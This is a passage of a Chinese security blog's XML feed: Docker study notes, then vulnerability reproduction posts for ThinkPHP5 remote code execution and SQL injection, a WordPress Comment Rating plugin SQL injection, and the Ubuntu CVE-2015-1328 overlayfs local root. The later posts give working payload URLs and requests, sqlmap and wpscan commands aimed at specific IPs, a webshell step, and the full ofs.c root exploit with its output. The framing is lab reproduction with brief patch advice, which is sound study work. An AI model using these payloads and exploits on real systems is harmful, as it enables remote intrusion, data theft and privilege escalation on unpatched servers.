然后在Discover面板选择msg-*模块就可以看到当前的数据]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>ELK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker学习笔记(一)]]></title>
    <url>%2F2019%2F05%2F14%2Fdocker%E5%9F%BA%E7%A1%80(%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[穷则思变,变则通,通则达! Docker简介:Docker是一个开源的应用容器引擎,让开发者可以打包他们的应用以及依赖包到一个可移植的容器中,然后发布到任何流行的Linux机器上,也可以实现虚拟化.容器是完全使用沙盒机制,互相之间不会有任何接口(类似iPhone的APP)几乎没有性能开销,很容易的在机器和数据中心中运行.最重要的是,他们不依赖任何语言,框架或包装系统 沙盒沙盒也叫沙箱,英文sandbox.在计算机领域指的是一种虚拟技术,且多用于计算机安全技术.安全软件可以先让它在沙盒中运行,如果有恶意行为,则禁止程序的进一步运行,而这不会给系统造成任何危害 Docker是dotCloud公司开源的一个基于LCX的高级容器引擎,源代码托管在github上,基于go语言并遵从Apache2.0协议开源,其官网为:&lt;https://www.docker.com LCXLCX是Linux Container的简写,Linux Container容器是一种内核虚拟化技术,可以提供轻量级的虚拟化,以便隔离进程和资源,而且不需要提供指令解释机制以及全虚拟化的其他复杂性 LCX主要是通过来自kernel的namespace实现每个用户实例之间的相互隔离,通过cgroup实现对资源的配置和度量. docker容器技术和虚拟机对比 相同点:docker容器技术和虚拟机技术都是虚拟化技术 不同点:docker相当于vm虚拟机,但少了虚拟机操作系统这一层,所以docker效率要比vm强 docker架构 工作流程:服务器A上运行docker engine服务,在docker engine上启动多个container,从外网docker hub上把image操作系统镜像下载下来,放到container容器中运行,这样一个容器的实例就运行起来了.最后通过docker client对docker容器虚拟化平台进行控制 image和container的区别:image可以理解为一个系统镜像,container是image在运行时的一个状态.如果拿虚拟机作一个比喻的话,image是关机状态下的磁盘文件,container是虚拟机运行时的磁盘文件,包括内存数据 docker hub是docker官方的镜像存储站点,其中提供了很多常用的镜像供用户下载,如ubuntu,centos等系统镜像,通过docker hub,用户也可以发布自己的docker镜像,为此用户需要注册一个账号,在网站上创建一个docker仓库 docker核心技术:namespace—–实现container的进程,网络,消息,文件系统和主机名的隔离 cgroup——实现对资源的配额和度量 docker的特性 文件系统隔离:每个进程容器运行在一个完全独立的根文件系统中 资源各类:系统资源,像CUP和内存等可以分配到不同的容器中,使用cgroup 日志记录:docker将会收集和记录每个进程容器的标准流(stdout/stderr/stdin),用于实时检索或批量检索 变更管理:容器文件系统的变更可以提交到新的镜像中,并可重复使用已创建更多的容器,无需使用模板或手工配置 交互式shell:docker可以分配一个虚拟终端并关联到任何容器的标准输入上,例如运行一个一次性交互的shell Docker的优缺点:优点： 一些优势和 VM 一样，但不是所有都一样。 VM 小，比 VM 快，Docker 容器的尺寸减小相比整个虚拟机大大简化了分布到云和从云分发时间和开销。Docker 启劢一个容器实例时间徆短，一两秒就可以启劢一个实例。 对于在笔记本电脑，数据中心的虚拟机，以及任何的云上，运行相同的没有变化的应用程序，IT 的发布速度更快。 Docker 是一个开放的平台，构建，发布和运行分布式应用程序。 Docker 使应用程序能够快速从组件组装和避免开发和生产环境之间的摩擦。 您可以在部署在公司局域网戒云戒虚拟机上使用它。 开发人员并不关心具体哪个 Linux 操作系统 使用 Docker，开发人员可以根据所有依赖关系构建相应的软件，针对他们所选择的操作系统。 然后，在部署时一切是完全一样的，因为一切都在 DockerImage 的容器在其上运行。 开发人员负责并且能够确保所有的相关性得到满足。 Google，微软，亚马逊，IBM 等都支持 Docker。 Docker 支持 Unix/Linux 操作系统，也支持 Windows 戒 Mac 缺点：1.Docker 用于应用程序时是最有用的，但并丌包含数据。日志，跟踪和数据库等通常应放在 Docker 容器外。一个容器的镜像通常都徆小，丌适合存大量数据，存储可以通过外部挂载的方式使用。比如使用：NFS，ipsan，MFS 等, -v 映射磁盘分区 2.一句话：docker 叧用于计算，存储交给别人。 3.oracle 不适合使用 docker 来运行，太大了，存储的数据太多。 安装docker在红帽7/centos7上安装 下载docker引擎的rpm安装包 1wget https://get.docker.com/rpm/1.7.1/centos-7/RPMS/x86_64/docker-engine-1.7.1-1.el7.centos.x86_64.rpm 安装docker 1rpm -ivh docker-engine-1.7.1-1.el7.centos.x86_64.rpm 开启docker 1systemctl start docker 设置开机自启 systemctl enable docker 查看docker信息 1docker info 查看所存在的镜像 1docker images 从 Docker Hub 仓库下载一个 Ubuntu 12.04 操作系统的镜像 1docker pull ubuntu:12.04 这条命令实际上相当于 docker pull registry.hub.docker.com/ubuntu:12.04 命令，即从注册服务器 registry.hub.docker.com 中的 ubuntu 仓库来下载标记为 12.04 的镜像。如果不指定版本的话,那么就去下载最新版的ubuntu 用镜像创建一个容器 -t :指定要创建的目标镜像名 1234docker run -t -i ubuntu:12.04 /bin/bash root@afcdf3ef30bc:/# cat /etc/issue //查看版本,发现已经进入了ubuntu Ubuntu 12.04.5 LTS \n \l root@afcdf3ef30bc:/# exit //退出镜像 exit 查看所存在的镜像 12345[root@localhost ~]# docker images REPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZE ubuntu 12.04 62b726df5062 23 months ago 103.6 MB docker inspect +IMAGE ID可以查看当前镜像的具体信息 1[root@localhost ~]# docker inspect 62b726df5062 通过docker rmi ubuntu:版本/id删除镜像 1[root@localhost ~]# docker rmi ubuntu:12.04 修改镜像的tag(标签) 1[root@localhost ~]# docker tag ubuntu:12.04 ubuntu:newtag docker下载kali系统 1[root@localhost ~]# docker pull kalilinux/kali-linux-docker 在Docker Hub搜寻镜像 1[root@localhost ~]# docker search httpd 查看docker详细信息 1[root@localhost ~]# docker info 从docker hub搜索所需要的镜像,如果 OFFICIAL 为[ok] ，说明可以放心使用。 1[root@localhost ~]# docker search centos 从docker hub拉取(下载)镜像 pull:拉 1[root@localhost ~]# docker pull centos pull镜像出错解决方法错误一1234567891011[root@xuegod63 ~]# docker pull docker.io/centosUsing default tag: latestTrying to pull repository docker.io/library/centos ... latest: Pulling from docker.io/library/centosGet https://registry-1.docker.io/v2/library/centos/manifests/sha256:822de5245dc5b659df56dd32795b08ae42db4cc901f3462fc509e91e97132dc0: net/http: TLS handshake timeout 法一:换国内源修改/etc/docker/daemon.json 1234567891011121314151617[root@xuegod63 ~]# vim /etc/docker/daemon.json #改成以下内容改： &#123;&#125;为：&#123;&quot;registry-mirrors&quot;: [&quot;https://e9yneuy4.mirror.aliyuncs.com&quot;]&#125;[root@xuegod63 ~]# systemctl daemon-reload**[root@xuegod63 ~]# systemctl restart docker**[root@xuegod63 ~]# docker pull docker.io/centos #再下载，就可以了。 法二：把之前下载好的 image 镜像导入 image：把 docker.io-centos.tar 镜像上传到 linux 上 参数： -i “ docker.io-centos.tar “ 指定载入的镜像归档。 1[root@xuegod63 ~]# docker load -i /root/docker.io-centos.tar 法三：直接下载其他站点的镜像123456[root@xuegod63 ~]# docker pull hub.c.163.com/library/tomcat:latest[root@xuegod63 ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEhub.c.163.com/library/tomcat** **latest 72d2be374029 4 months ago 292.4 MB 查看 images 列表 12345678[root@xuegod63 ~]# docker images #列出本地所有镜像。其中 [name] 对镜像名称进行关键词查询。[root@xuegod63 ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEdocker.io/centos latest 8caf41e7a3ea 31 minutes ago 205.3 MB 错误二:如果报以下错误:表示没有开启网络转发功能的话就会报错,默认已自动打开 那么输入以下内容 1[root@localhost ~]# echo 1 &gt;/proc/sys/net/ipv4/ip_forward 或者修改一下文件 12345678910111213[root@xuegod63 ~]# vim /etc/sysctl.conf #插入以下内容 net.ipv4.ip_forward = 1 [root@xuegod63 ~]# sysctl -p #生效 net.ipv4.ip_forward = 1 [root@xuegod63 ~]# cat /proc/sys/net/ipv4/ip_forward 1 docker实践:实例1:在实例中执行bash命令运行一个container并加载centos,运行起来之后,在实例中执行/bin/bash命令 run:运行 -i:以交互模式运行容器,通常与-t同时使用 -t:为容器重新分配一个伪输入终端,通常与-i同时使用 格式:docker run -it 镜像名:tags /bin/bash 12[root@localhost ~]# docker run -it centos /bin/bash [root@47a67a198aa8 /]# exit exit 实例2:模拟后台运行服务例2:在container中运行一个长久运行的进程,不断向stdin输出helloworld,模拟一个后台运行服务 docker常用参数: -d:在后台运行容器,并返回容器ID -c:后面跟待完成的命令,bash指的是使用bash去执行命令 1[root@localhost ~]# docker run -d centos:latest bash -c &quot;while true;do echo hello,world;sleep 1;done&quot; 2822f36cb76defc5923ea509d32eaa3fae165830064484746c97aabbc0339839 返回值为容器的ID 也可以使用docker ps查看所有运行的容器,可以发现其容器ID 1[root@localhost docker]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2822f36cb76d centos:latest &quot;bash -c &apos;while true 11 minutes ago Up 11 minutes goofy_hodgkin ​ 列所有的容器(包含沉睡/退出状态的容器) 1docker ps -a 从容器中取日志,查看输出内容 语法:docker logs 容器id 1[root@localhost ~]# dockerCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2822f36cb76d centos:latest &quot;bash -c &apos;while true 11 minutes ago Up 11 minutes goofy_hodgkin logs 2822f36cb76defc5923ea509d32eaa3fae165830064484746c97aabbc0339839 实例3:kill掉一个容器首先列出所有的容器 1[root@localhost ~]# docker ps -a 杀死容器docker kill 容器ID 1[root@localhost ~]# docker kill c4a213627f1b c4a213627f1b 关闭容器 1[root@localhost ~]# docker stop 2822f36cb76d 2822f36cb76d 开启容器 1[root@localhost ~]# docker start 2822f36cb76d 2822f36cb76d 删除容器(不能删除正在运行的容器) 1[root@localhost ~]# docker rm 2822f36cb76d 强制删除容器(可以删正在运行的容器) 1[root@localhost ~]# docker rm -f 2822f36cb76d 删除镜像(image) 12[root@localhost ~]# docker rmi 9ab5ff067039 Deleted: 9ab5ff0670399b1ac4dad4c2aaf61e59489155325d3fb5082ecae75d2b3e5fc8 docker镜像制作方法: 法一:使用docker commit 容器ID(或者镜像名),保存container的当前状态到image后,然后生成对应的image 123[root@localhost ~]# docker commit 95e796801e15433631bb6cee9e4f101503396db5732f578c4a842ceeb6d82862 centos1:lastest #docker commit 容器ID 生成的容器名:标签#也可以直接docker commit 容器ID 法二:在Docker file文件下使用docker build自动化制作镜像,Dockerfile有点像源码编译时./configure后产生的Makefile 12345678910111213141516[root@localhost ~]# cd /[root@localhost /]# mkdir docker-build[root@localhost /]# cd docker-build/[root@localhost docker-build]# touch Dockerfile[root@localhost docker-build]# vim Dockerfile #填写以下内容FROM docker.io/centos:latest #FROM基于哪个镜像MAINTAINER &lt;mk@xuegod.cn&gt; #MAINTAINER镜像创建者RUN yum -y install httpd #RUN安装软件ADD start.sh /usr/local/bin/start.sh #把start.sh启动脚本安装到镜像的/usr/local/bin/start.sh目录下#把index.html启动脚本安装到镜像的/var/www/html/index.html里ADD index.html /var/www/html/index.html #container启动时执行的命令或启动服务,但是一个Dockerfile中只能有一条CMD命令,多条则CMD echo hello,world 或者写入另一个Dockerfile文件 12345678# vim dockefile1FROM ubuntuMAINTAINER xxxRUN echo hello1 &gt; test1.txtRUN echo hello2 &gt; /test2.txtEXPOSE 80EXPOSE 81CMD [&quot;/bin/bash&quot;] 3、创建 start.sh 脚本启劢 httpd 服务和 apache 默认首页 index.html 文件 12345[root@localhost docker-build]# echo &quot;/usr/sbin/httpd -DFOREGROUND&quot; &gt; start.sh 注: /usr/sbin/httpd -DFOREGROUND 相当于执行了 systemctl start httpd [root@localhost docker-build]# chmod a+x start.sh 创建 index.html 1[root@localhost docker-build]# echo &quot;docker image build test&quot; &gt; index.html 4、使用命令 build 来创建新的 image 语法：docker build -t 父镜像名：镜像的 tag Dockerfile 文件所在路径 -t :表示 tage，镜像名 例：使用命令 docker build 来创建新的 image,并命名为 docker.io/centos:httpd 1[root@localhost docker-build]# docker build -t docker.io/centos:httpd ./ 注： ./ 表示当前目彔。另外你的当前目彔下要包含 Dockerfile Docker Image的发布docker镜像=应用/程序+库 方法一:save image to tarball,保存镜像到tar包 语法: 1docker save -o 导出的镜像名.tar 本地镜像名:镜像标签 然后导入时使用 1docker load -i 导出的镜像名.tar 方法二:push到docker hub上 1.注册账号:https://hub.docker.com/ 2.登陆docker hub 1docker login -u 用户名 -p 密码 -e 邮箱地址 3.上传镜像 1docker image 镜像名:标签 4.下载镜像 1docker pull 用户名/镜像名 docker端口映射端口映射-d:设置容器在在后台一直运行 -p:设置端口映射,格式为本地端口:docker容器端口 -c:执行系统命令,这个文件是我本地写好的自动化脚本用来打开HTTP服务 1[root@localhost ~]# docker run -d -p 80:80 centos:httpd /bin/bash -c /usr/local/bin/start.sh 注:当前使用的docker实例运行的网络模式相当于VMware中的NAT模式 查看正在运行的容器1[root@localhost ~]# docker ps 访问容器实例docker exec -it /bin/bash 1docker exec -it centos:httpd /bin/bash]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Thinkphp5漏洞总结]]></title>
    <url>%2F2019%2F03%2F13%2Fthinkphp5%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[人生是个圆，有的人走了一辈子也没有走出命运画出的圆圈，其实，圆上的每一个点都有一条腾飞的切线。 ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞漏洞描述ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。 漏洞等级高级 漏洞危害远程代码执行 漏洞检测方法利用POC去试验是否存在该漏洞 漏洞利用方法启动docker环境: 1docker-compose up -d 然后修改URL中的参数,构造POC,成功执行命令 发送的数据包为: 1http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1` 也可以执行其他命令,只需替换vars[0]的值即可 漏洞修复方案:1,及时去thinkphp官网修补漏洞 2,更新到最新版 ThinkPHP5 5.0.23 远程代码执行漏洞漏洞描述ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，在获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。 漏洞等级高级 漏洞危害远程代码执行 漏洞检测方法利用POC去试验是否存在该漏洞 漏洞利用方法启动docker环境: 1docker-compose up -d 然后刷新页面,构造POC,成功执行命令 发送的数据包为: 123456789101112POST /index.php?s=captcha HTTP/1.1Host: 192.168.136.128:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id 也可以执行其他命令,只需替换server[REQUEST_METHOD]的值即可 漏洞修复方案:1,及时去thinkphp官网修补漏洞 2,更新到最新版 ThinkPHP5版本 SQL注入漏洞和敏感信息泄露漏洞漏洞描述ThinkPHP5版本存在一个鸡肋的SQL注入漏洞,可以获取到当前用户和密码以及数据库名等信息,详情参考:https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html 漏洞等级低危 漏洞危害获取到数据库配置信息(用户名,密码,数据库名,主机名) 漏洞检测方法利用POC去试验是否存在该漏洞 漏洞利用方法启动docker环境: 1docker-compose up -d 如果出现以下错误: 1ERROR: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers) 那么需要去修改/etc/resolv.conf修改为: 123nameserver 8.8.8.8nameserver 8.8.4.4nameserver 10.0.0.10 访问以下URL进入网站,出现用户名表示成功访问: 1http://Your-Ip/index.php?ids[]=1&amp;ids[]=2 然后使用xpath报错的方法去构造POC,成功执行命令 请求的URL为: http://192.168.136.128/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 1http://your-ip:8080/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 漏洞修复方案:1,及时去thinkphp官网修补漏洞 2,更新到最新版]]></content>
      <categories>
        <category>中间件漏洞</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WordPress插件注入漏洞]]></title>
    <url>%2F2019%2F03%2F05%2Fwordpress%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[最具挑战性的挑战莫过于提升自我。——迈克尔·F·斯特利 漏洞名称：WordPress Plugin Comment Rating 2.9.32 SQL注入漏洞 漏洞描述：wordpress中的comment-rating2.9.32插件中的ck-processkarma.php文件存在HTTP_X_FORWARDED_FOR header inject Vulnerability 漏洞等级高级 漏洞检测方法：wpscan扫描 漏洞利用方法： 浏览网页，发现是WordPress网站 2.使用wpscan进行扫描 1wpscan -u &quot;http://219.153.49.228:48606/&quot; --enumerate vp 得出comment-rating插件存在SQL注入漏洞 12345678910+] Name: comment-rating - v2.9.32 | Location: http://219.153.49.228:48606/wp-content/plugins/comment-rating/ | Readme: http://219.153.49.228:48606/wp-content/plugins/comment-rating/readme.txt[!] Directory listing is enabled: http://219.153.49.228:48606/wp-content/plugins/comment-rating/[!] Title: Comment Rating 2.9.32 - Security Bypass Weakness &amp; SQL Injection Reference: https://wpvulndb.com/vulnerabilities/6428 Reference: http://packetstormsecurity.com/files/120569/ Reference: https://secunia.com/advisories/52348/ Reference: https://www.exploit-db.com/exploits/24552/ 3.查看 https://www.exploit-db.com/exploits/24552/， 根据其介绍的知是HTTP_X_FORWARDED_FOR header注入漏洞。 123456789101112131415161718192021222324252627Vulnerable Code: /wp-content/plugins/comment-rating/ck-processkarma.phpFirst take the IP from HTTP_X_FORWARDED_FOR header.-----------------------------------------------------------------------48 $ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) ? getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) : getenv(&quot;REMOTE_ADDR&quot;);49 if(strstr($row[&apos;ck_ips&apos;], $ip)) &#123;50 // die(&apos;error|You have already voted on this item!&apos;); 51 // Just don&apos;t count duplicated votes52 $duplicated = 1;53 $ck_ips = $row[&apos;ck_ips&apos;];54 &#125;Later made a UPDATE without filter the input.------------------------------------------------------------------------77 $query = &quot;UPDATE `$table_name` SET ck_rating_$direction = &apos;$rating&apos;, ck_ips = &apos;&quot; . $ck_ips . &quot;&apos; WHERE ck_comment_id = $k_id&quot;;So let&apos;s take a look in the DBmysql&gt; select * from wp_comment_rating;+---------------+----------------+--------------+----------------+| ck_comment_id | ck_ips | ck_rating_up | ck_rating_down |+---------------+----------------+--------------+----------------+| 2 | ,20.209.10.130 | 1 | 0 || 3 | | 0 | 0 |+---------------+----------------+--------------+----------------+2 rows in set (0.00 sec) 4.EDB提供的POC，但我本地尝试运行这个POC并未成功，所以构造语句，使用sqlmap进行查询 12345678910111213141516171819202122&lt;?PHPdefine(&apos;HOST&apos;,&apos;http://localhost/wordpress/&apos;);define(&apos;IDCOMMENT&apos;,2);$url=parse_url(HOST);define(&apos;URL&apos;,$url[&apos;path&apos;].&apos;wp-content/plugins/comment-rating/ck-processkarma.php?id=&apos;.IDCOMMENT.&apos;&amp;action=add&amp;path=a&amp;imgIndex=1_14_&apos;);for($i=0;$i&lt;1;$i++) lvlup();function lvlup()&#123; global $url; $header = &quot;GET &quot;.URL.&quot; HTTP/1.1 \r\n&quot;; $header.= &quot;Host: &quot;.$url[&apos;host&apos;].&quot;\r\n&quot;; $header.= &quot;Accept-Encoding: gzip, deflate \r\n&quot;; $header.= &quot;X-Forwarded-For: &quot;.long2ip(rand(0, &quot;4294967295&quot;)).&quot;\r\n&quot;; $header.= &quot;Connection: close \r\n\r\n&quot;; $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); socket_connect($socket,$url[&apos;host&apos;], 80); socket_write($socket, $header); socket_close($socket);&#125;?&gt; 5.查询语句为： 1sqlmap &quot;http://219.153.49.228:40602/wp-content/plugins/comment-rating/ck-processkarma.php?id=1&amp;action=add&amp;path=a&amp;imgIndex=1_14_&quot; -f 然后查出库名，表名，列名，字段名，这个很简单，我就不多说啦。 6，然后登陆账号，在插件中添加PHP一句话木马，记得开启插件功能 7，菜刀连接木马即可获取shell. 漏洞修复方案：及时更新插件]]></content>
      <categories>
        <category>中间件漏洞</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu本地提权漏洞复现]]></title>
    <url>%2F2019%2F03%2F03%2FUbuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[知人者智，自知者明。胜人者有力，自胜者强。 ——老子 Ubuntu本地提权漏洞（CVE-2015-1328）漏洞原理：这个漏洞是因为在Ubuntu到15.04 之前的3.19.0-21.21 的linux（又名Linux内核）包中的overlayfs实现没有正确检查上层文件系统目录中的文件创建权限，这允许本地用户通过利用其中的配置来获取root访问权限。任意mount命名空间中都允许使用overlayfs。当在用户命名空间内使用overlayfs 挂载时，一名安全从业者Philip Pettersson发现了权限升级漏洞，本地用户即可利用此漏洞获取系统的管理权限。 报告中是这样说的： “当在上层文件系统目录中创建新文件时，overlayfs文件系统未能正确检查此文件的权限。而这一缺陷则可以被内核中没有权限的进程所利用，只要满足该进程CONFIG_USER_NS=y及overlayfs所拥有得FS_USERNS_MOUNT标志，即允许挂载非特权挂载空间的overlayfs。而这一条件是Ubuntu 12.04、14.04、14.10和15.04版本中的默认配置，所以这些版本的Ubuntu系统都受此漏洞影响。ovl_copy_up_ 函数未能正确检查用户是否有权限向upperdir目录写入文件。而该函数唯一检查的是被修改文件的拥有者是否拥有向upperdir目录写入文件的权限。此外，当从lowerdir目录复制一个文件时，同时也就复制了文件元数据，而并非文件属性，例如文件拥有者被修改为了触发copy_up_程序的用户。” 影响版本： Ubuntu Linux 15.04 Ubuntu Linux 14.10 Ubuntu Linux 14.04 Ubuntu Linux 12.04 漏洞复现：将下面POC代码存放到本地的一个文件内，也可以去EDB网站下载https://www.exploit-db.com/exploits/37292/。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152/*# Exploit Title: ofs.c - overlayfs local root in ubuntu# Date: 2015-06-15# Exploit Author: rebel# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04# CVE : CVE-2015-1328 (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*CVE-2015-1328 / ofs.coverlayfs incorrect permission handling + FS_USERNS_MOUNTuser@ubuntu-server-1504:~$ uname -aLinux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linuxuser@ubuntu-server-1504:~$ gcc ofs.c -o ofsuser@ubuntu-server-1504:~$ iduid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)user@ubuntu-server-1504:~$ ./ofsspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# iduid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)greets to beist &amp; kaliman2015-05-24%rebel%*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=**/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sched.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mount.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sched.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mount.h&gt;#include &lt;sys/types.h&gt;#include &lt;signal.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;linux/sched.h&gt;#define LIB &quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n return _real_getuid();\n&#125;\n&quot;static char child_stack[1024*1024];static intchild_exec(void *stuff)&#123; char *file; system(&quot;rm -rf /tmp/ns_sploit&quot;); mkdir(&quot;/tmp/ns_sploit&quot;, 0777); mkdir(&quot;/tmp/ns_sploit/work&quot;, 0777); mkdir(&quot;/tmp/ns_sploit/upper&quot;,0777); mkdir(&quot;/tmp/ns_sploit/o&quot;,0777); fprintf(stderr,&quot;mount #1\n&quot;); if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;) != 0) &#123;// workdir= and &quot;overlay&quot; is needed on newer kernels, also can&apos;t use /proc as lower if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123; fprintf(stderr, &quot;no FS_USERNS_MOUNT for overlayfs on this kernel\n&quot;); exit(-1); &#125; file = &quot;.access&quot;; chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777); &#125; else file = &quot;ns_last_pid&quot;; chdir(&quot;/tmp/ns_sploit/o&quot;); rename(file,&quot;ld.so.preload&quot;); chdir(&quot;/&quot;); umount(&quot;/tmp/ns_sploit/o&quot;); fprintf(stderr,&quot;mount #2\n&quot;); if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;) != 0) &#123; if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123; exit(-1); &#125; chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777); &#125; chmod(&quot;/tmp/ns_sploit/o/ld.so.preload&quot;,0777); umount(&quot;/tmp/ns_sploit/o&quot;);&#125;intmain(int argc, char **argv)&#123; int status, fd, lib; pid_t wrapper, init; int clone_flags = CLONE_NEWNS | SIGCHLD; fprintf(stderr,&quot;spawning threads\n&quot;); if((wrapper = fork()) == 0) &#123; if(unshare(CLONE_NEWUSER) != 0) fprintf(stderr, &quot;failed to create new user namespace\n&quot;); if((init = fork()) == 0) &#123; pid_t pid = clone(child_exec, child_stack + (1024*1024), clone_flags, NULL); if(pid &lt; 0) &#123; fprintf(stderr, &quot;failed to create new mount namespace\n&quot;); exit(-1); &#125; waitpid(pid, &amp;status, 0); &#125; waitpid(init, &amp;status, 0); return 0; &#125; usleep(300000); wait(NULL); fprintf(stderr,&quot;child threads done\n&quot;); fd = open(&quot;/etc/ld.so.preload&quot;,O_WRONLY); if(fd == -1) &#123; fprintf(stderr,&quot;exploit failed\n&quot;); exit(-1); &#125; fprintf(stderr,&quot;/etc/ld.so.preload created\n&quot;); fprintf(stderr,&quot;creating shared library\n&quot;); lib = open(&quot;/tmp/ofs-lib.c&quot;,O_CREAT|O_WRONLY,0777); write(lib,LIB,strlen(LIB)); close(lib); lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;); if(lib != 0) &#123; fprintf(stderr,&quot;couldn&apos;t create dynamic library\n&quot;); exit(-1); &#125; write(fd,&quot;/tmp/ofs-lib.so\n&quot;,16); close(fd); system(&quot;rm -rf /tmp/ns_sploit /tmp/ofs-lib.c&quot;); execl(&quot;/bin/su&quot;,&quot;su&quot;,NULL);&#125; 然后将其保存到本地的一个文件里去。 1234567891011121314ica@indishell:~$ chmod 777 Ubuntu_EXP.c //赋予文件权限ica@indishell:~$ gcc Ubuntu_EXP.c -o Ubuntu_EXP //编译程序ica@indishell:~$ lsUbuntu_EXP Ubuntu_EXP.cica@indishell:~$ ./Ubuntu_EXP //执行EXPspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# id //检测提权是否成功uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),114(sambashare),1000(ica)# CVE-2017-16995 Ubuntu16.04本地提权漏洞漏洞描述Ubuntu 16.04版本存在本地提权漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。 